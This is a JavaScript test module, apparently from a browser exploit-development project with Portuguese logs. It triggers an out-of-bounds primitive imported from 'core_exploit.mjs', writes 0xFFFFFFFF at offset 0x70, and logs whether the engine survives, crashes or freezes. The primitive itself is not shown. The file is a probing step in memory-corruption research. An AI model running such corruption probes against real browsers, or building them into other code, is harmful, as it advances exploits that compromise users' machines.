// js/script3/testImmediateEffectOfOOBWrite.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export async function executeImmediateEffectOfOOBWriteTest() {
    const FNAME_TEST = "executeImmediateEffectOfOOBWriteTest";
    logS3(`--- Iniciando Teste: Efeito Imediato da Escrita OOB em 0x70 ---`, "test", FNAME_TEST);
    document.title = `Immediate Effect 0x70 Write`;

    const corruption_offset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write = 0xFFFFFFFF;
    const bytes_to_write = 4;

    logS3(`Configurando ambiente OOB...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`Ambiente OOB configurado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa antes da escrita crítica

    logS3(`Realizando escrita OOB: ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset)}]...`, "warn", FNAME_TEST);
    try {
        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write);
        logS3("   Escrita OOB em 0x70 realizada com sucesso.", "good", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO CRÍTICO durante a escrita OOB em 0x70: ${e_write.name} - ${e_write.message}`, "error", FNAME_TEST);
        document.title = `ERROR on 0x70 Write!`;
        clearOOBEnvironment();
        return;
    }

    // Operações de verificação imediata
    logS3("Verificando funcionalidade pós-escrita OOB em 0x70...", "info", FNAME_TEST);
    let still_alive = false;
    try {
        let x = 1 + 1; // Operação matemática simples
        logS3(`   Operação matemática simples (1+1) OK. Resultado: ${x}`, "good", FNAME_TEST);

        await PAUSE_S3(100); // Pausa um pouco mais longa para ver se o congelamento ocorre aqui

        logS3(`   Tentando alocar new ArrayBuffer(32)...`, "info", FNAME_TEST);
        let test_ab = new ArrayBuffer(32);
        logS3(`   Alocação de ArrayBuffer(32) OK. test_ab.byteLength: ${test_ab.byteLength}`, "good", FNAME_TEST);

        logS3(`   Tentando logS3 final...`, "info", FNAME_TEST);
        logS3("   SOBREVIVEMOS à escrita em 0x70 e operações subsequentes!", "vuln", FNAME_TEST);
        still_alive = true;
        document.title = `Survived 0x70 Write!`;

    } catch (e_after_write) {
        logS3(`   ERRO CRÍTICO APÓS a escrita em 0x70: ${e_after_write.name} - ${e_after_write.message}`, "critical", FNAME_TEST);
        if (e_after_write.stack) {
            logS3(`     Stack: ${e_after_write.stack}`, "error", FNAME_TEST);
        }
        document.title = `CRASH After 0x70 Write! (${e_after_write.name})`;
    }

    if (!still_alive && !document.title.includes("CRASH")) {
        // Se não chegou ao log de "SOBREVIVEMOS" e não houve erro capturado, pode ter congelado.
        logS3("   AVISO: O script pode ter congelado após a escrita em 0x70 antes de completar todas as verificações.", "error", FNAME_TEST);
        document.title = `FREEZE? After 0x70 Write`;
    }

    clearOOBEnvironment();
    logS3(`--- Teste Efeito Imediato da Escrita OOB em 0x70 CONCLUÍDO ---`, "test", FNAME_TEST);
}
